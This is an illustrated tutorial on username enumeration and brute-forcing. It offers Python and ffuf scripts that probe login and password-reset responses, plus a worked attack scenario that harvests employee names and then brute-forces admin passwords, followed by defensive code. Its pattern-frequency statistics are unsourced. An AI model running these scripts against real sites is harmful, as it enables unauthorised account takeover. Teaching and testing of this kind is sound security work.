# 👤 **Brute-Forcing Usernames - The Complete Guide**

## 🎯 **What is Username Brute-Forcing?**

Think of it like finding someone's email address before trying to hack their account:

```
GOAL: Find valid usernames first, THEN try passwords!

┌─────────────────────────────────────────┐
│  Step 1: Find Usernames                   │
│  ────────────────────────                 │
│  Try: john.doe@company.com → Exists? ✅   │
│  Try: jane.smith@company.com → Exists? ✅ │
│  Try: fakeuser@company.com → No ❌        │
│                                           │
│  Step 2: Attack Known Users               │
│  ────────────────────────                 │
│  john.doe:password123? ❌                  │
│  john.doe:qwerty? ❌                       │
│  john.doe:letmein? ✅ HACKED!              │
└─────────────────────────────────────────┘
```

## 📋 **Why Attack Usernames First?**

```python
# Without usernames: Need to guess BOTH
total_attempts = all_usernames × all_passwords
# 10,000 usernames × 10,000 passwords = 100 MILLION attempts!

# With valid usernames: Only guess passwords
total_attempts = valid_usernames × all_passwords  
# 50 valid users × 10,000 passwords = 500,000 attempts!
# 200x more efficient!
```

## 🔍 **Common Username Patterns**

### **1. Email Pattern Guessing**
```python
# Company uses: first.last@company.com
usernames = [
    "john.doe@company.com",
    "jane.smith@company.com",
    "bob.johnson@company.com",
    "alice.williams@company.com"
]

# How attackers generate these:
first_names = ["john", "jane", "bob", "alice"]
last_names = ["doe", "smith", "johnson", "williams"]

for first in first_names:
    for last in last_names:
        email = f"{first}.{last}@company.com"
        test_username(email)
```

### **2. Common Admin Usernames**
```python
admin_usernames = [
    "admin",
    "administrator",
    "root",
    "sysadmin",
    "webmaster",
    "support",
    "it.support",
    "helpdesk",
    "superuser",
    "supervisor",
    "manager",
    "owner",
    "ceo",
    "cto",
    "admin1",
    "admin123"
]
```

### **3. Pattern-Based Guessing**
```
COMPANY: Acme Corporation

Possible usernames:
┌─────────────────────────────┐
│ Pattern          │ Example  │
├─────────────────┼───────────│
│ first.last      │ john.doe  │
│ firstl          │ johnd     │
│ first.last      │ j.doe     │
│ last.first      │ doe.john  │
│ flast           │ jdoe      │
│ first_last      │ john_doe  │
│ first-last      │ john-doe  │
│ first           │ john      │
└─────────────────────────────┘
```

## 🎪 **Real-World Examples**

### **Example 1: Public Profile Pages**
```html
<!-- Website: linkedin.com (public profiles) -->

<!-- Attacker doesn't need account to see: -->
<div class="profile">
    <h3>John Smith</h3>
    <p>Senior Developer at Tech Corp</p>
    <p>Email: john.smith@techcorp.com</p>
</div>

<div class="profile">
    <h3>Sarah Johnson</h3>
    <p>IT Administrator at Tech Corp</p>
    <p>Email: s.johnson@techcorp.com</p>
</div>

<!-- Now attacker has valid usernames! -->
usernames_found = [
    "john.smith@techcorp.com",
    "s.johnson@techcorp.com"
]
```

### **Example 2: Error Message Leakage**
```http
# Attacker tests username existence through error messages

Request 1:
POST /login HTTP/1.1
Host: vulnerable-bank.com

username=john.doe@bank.com&password=wrongpass

Response:
HTTP/1.1 200 OK
"Invalid password"  # AHA! Username exists!

Request 2:
POST /login HTTP/1.1
Host: vulnerable-bank.com

username=fakeuser@bank.com&password=wrongpass

Response:
HTTP/1.1 200 OK
"Invalid username"  # Username doesn't exist

# Different messages = username enumeration!
```

### **Example 3: Password Reset Feature**
```http
# Testing via password reset

POST /forgot-password HTTP/1.1
Host: company-portal.com

email=admin@company.com

Response:
HTTP/1.1 200 OK
"Password reset email sent to admin@company.com"
# Confirms admin@company.com exists!

POST /forgot-password
email=fakeuser@company.com

Response:
"Email address not found in our system"
# Different message = username enumeration!
```

## 🛠️ **Tools and Techniques**

### **1. Manual Testing Script**
```python
import requests

def enumerate_usernames(url, username_list):
    found_users = []
    
    for username in username_list:
        # Try login with wrong password
        data = {
            'username': username,
            'password': 'wrongpassword123!'
        }
        
        response = requests.post(url, data=data)
        
        # Check response for clues
        if 'Invalid password' in response.text:
            found_users.append(username)
            print(f"✅ Found: {username}")
        elif 'Invalid username' in response.text:
            print(f"❌ Not found: {username}")
        else:
            print(f"⚠️  Ambiguous: {username}")
    
    return found_users

# Test common patterns
usernames = [
    'admin',
    'administrator',
    'john.doe',
    'jane.smith'
]

found = enumerate_usernames('https://target.com/login', usernames)
print(f"Valid usernames: {found}")
```

### **2. Using Burp Suite Intruder**
```
1. Capture login request
2. Send to Intruder
3. Mark username position
4. Load username wordlist
5. Start attack
6. Sort by response length/status
   - Different length = valid username!
```

### **3. Automated Tools**
```bash
# Using ffuf for username enumeration
ffuf -u https://target.com/login -X POST \
     -d "username=FUZZ&password=wrong" \
     -w usernames.txt \
     -fr "Invalid username"  # Filter out "Invalid username" responses
```

## 🎯 **Where to Find Username Clues**

### **Public Sources**
```
📧 Email formats from company website
   - "Contact us: info@company.com" → pattern: first@company?

👥 Team pages
   - "Meet our team: John Smith" → likely john.smith@company.com

📄 Job postings
   - "Email your resume to hr@company.com"

🔗 LinkedIn
   - Employee profiles often show email patterns

📱 Social media
   - Twitter handles often match usernames

📰 News articles
   - Quotes from employees with names

🗄️ Data breaches
   - Previously leaked credentials
```

### **Technical Sources**
```http
# API endpoints
GET /api/users/1
Response: {"id":1, "username":"jsmith", "email":"john.smith@company.com"}

# Directory listings
GET /~jsmith/ (if enabled)

# Source code comments
<!-- TODO: Remove debug user - admin:temp123 -->

# JavaScript files
const config = { apiUser: "internal_api", email: "api@company.com" }

# Error messages
"User 'admin' not found" vs "Invalid password"
```

## 📊 **Username Pattern Statistics**

```
COMMON USERNAME PATTERNS (by frequency):
────────────────────────────────────────
first.last@company.com       35%
firstl@company.com           20%
f.last@company.com           15%
first@company.com            10%
flast@company.com             8%
last.first@company.com         5%
Other patterns                 7%

COMMON ADMIN USERNAMES:
────────────────────────────────────────
admin                         40%
administrator                 20%
root                          15%
sysadmin                      10%
webmaster                      5%
Other                          10%
```

## 🎮 **Complete Attack Scenario**

### **Target: MegaCorp Internal Portal**

**Phase 1: Information Gathering**
```python
# Step 1: Visit company website
# Found team page with 50 employee names

names = [
    "John Smith",
    "Sarah Johnson",
    "Michael Chen",
    "Emily Brown",
    # ... 46 more
]

# Step 2: Guess email pattern
# Found "Contact: info@megacorp.com"
# Pattern likely: first.last@megacorp.com

emails = []
for name in names:
    first, last = name.lower().split()
    emails.append(f"{first}.{last}@megacorp.com")
    emails.append(f"{first[0]}.{last}@megacorp.com")
    emails.append(f"{first}@megacorp.com")
```

**Phase 2: Username Enumeration**
```python
# Step 3: Test each email on login page
found_users = []

for email in emails:
    response = requests.post(
        'https://portal.megacorp.com/login',
        data={'username': email, 'password': 'wrong'}
    )
    
    if 'Invalid password' in response.text:
        found_users.append(email)
        print(f"✅ Valid: {email}")

print(f"Found {len(found_users)} valid usernames")
```

**Phase 3: Targeted Attack**
```python
# Step 4: Look for admin accounts
admin_indicators = ['admin', 'it', 'support', 'sys', 'root']

admin_accounts = []
for user in found_users:
    if any(ind in user.lower() for ind in admin_indicators):
        admin_accounts.append(user)
        print(f"🎯 Potential admin: {user}")

# Step 5: Now brute-force passwords on admin accounts!
for admin in admin_accounts:
    for password in common_passwords:
        if try_login(admin, password):
            print(f"💥 HACKED: {admin}:{password}")
```

## 🛡️ **Defense Mechanisms**

### **1. Generic Error Messages**
```javascript
// BAD - Different messages
app.post('/login', (req, res) => {
    const user = db.findUser(req.body.username);
    
    if (!user) {
        return res.send('Invalid username');  // Too specific!
    }
    
    if (!checkPassword(user, req.body.password)) {
        return res.send('Invalid password');  // Different message!
    }
});

// GOOD - Same message for both
app.post('/login', (req, res) => {
    const user = db.findUser(req.body.username);
    
    if (!user || !checkPassword(user, req.body.password)) {
        return res.send('Invalid username or password');  // Same message!
    }
});
```

### **2. Rate Limiting on All Endpoints**
```javascript
// Apply rate limiting to ALL auth-related endpoints
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 attempts per IP
    message: 'Too many attempts, please try again later'
});

app.post('/login', authLimiter, loginHandler);
app.post('/forgot-password', authLimiter, forgotPasswordHandler);
app.post('/register', authLimiter, registerHandler);
```

### **3. CAPTCHA After Attempts**
```javascript
let attempts = {};

app.post('/login', (req, res) => {
    const ip = req.ip;
    
    // Track attempts per IP
    attempts[ip] = (attempts[ip] || 0) + 1;
    
    if (attempts[ip] > 3) {
        if (!req.body.captcha || !verifyCaptcha(req.body.captcha)) {
            return res.render('login', { 
                error: 'Please complete CAPTCHA',
                showCaptcha: true 
            });
        }
    }
    
    // Normal login logic...
});
```

### **4. Account Lockout**
```python
def login(username, password):
    # Check failed attempts for this username
    failed = redis.get(f"failed:{username}")
    
    if failed and int(failed) >= 5:
        # Same message even for locked accounts!
        return "Invalid username or password"
    
    if authenticate(username, password):
        redis.delete(f"failed:{username}")
        return "Login successful"
    else:
        redis.incr(f"failed:{username}")
        redis.expire(f"failed:{username}", 1800)
        # Same message for all failures!
        return "Invalid username or password"
```

## 🔍 **Testing Your Own Site**

### **Enumeration Test Script**
```python
import requests
import time

def test_username_enumeration(url, test_users):
    """
    Test if website leaks username information
    """
    results = {}
    
    for username in test_users:
        # Test login endpoint
        login_resp = requests.post(
            f"{url}/login",
            data={'username': username, 'password': 'wrong'}
        )
        
        # Test password reset endpoint
        reset_resp = requests.post(
            f"{url}/forgot-password",
            data={'email': username}
        )
        
        results[username] = {
            'login_response_length': len(login_resp.text),
            'login_status': login_resp.status_code,
            'reset_response_length': len(reset_resp.text),
            'reset_status': reset_resp.status_code
        }
        
        time.sleep(0.5)  # Be nice
    
    # Analyze for differences
    analyze_results(results)
    
def analyze_results(results):
    base_user = list(results.keys())[0]
    base = results[base_user]
    
    for user, data in results.items():
        if data['login_response_length'] != base['login_response_length']:
            print(f"⚠️  Login response length differs for {user}")
        if data['reset_response_length'] != base['reset_response_length']:
            print(f"⚠️  Reset response length differs for {user}")
            
# Test with mix of real and fake users
test_users = [
    'admin@yourcompany.com',  # Real (if exists)
    'fakeuser123@yourcompany.com',  # Fake
    'support@yourcompany.com',  # Real (if exists)
    'nonexistent456@yourcompany.com'  # Fake
]

test_username_enumeration('https://yoursite.com', test_users)
```

## 📝 **Quick Detection Checklist**

```
CHECK FOR USERNAME ENUMERATION:
□ Different login error messages
□ Different password reset responses
□ Different response times
□ Different status codes
□ Different response lengths
□ Email addresses in public profiles
□ Username patterns in URLs
□ API endpoints leaking user data
□ Registration "username taken" messages
□ Forgot password "email not found" messages
```

## 🎓 **Key Takeaways**

1. **Usernames are half the battle** - Finding valid usernames makes attacks 200x more efficient
2. **Patterns are predictable** - Companies use consistent username formats
3. **Error messages leak info** - Different messages = enumeration vulnerability
4. **Public profiles are goldmines** - LinkedIn, team pages, etc.
5. **Protect ALL endpoints** - Login, password reset, registration all leak info
6. **Consistency is key** - Same message for all failures, every time

Remember: **Attackers don't need to guess both username AND password - they find usernames first, then focus on passwords!** 🔍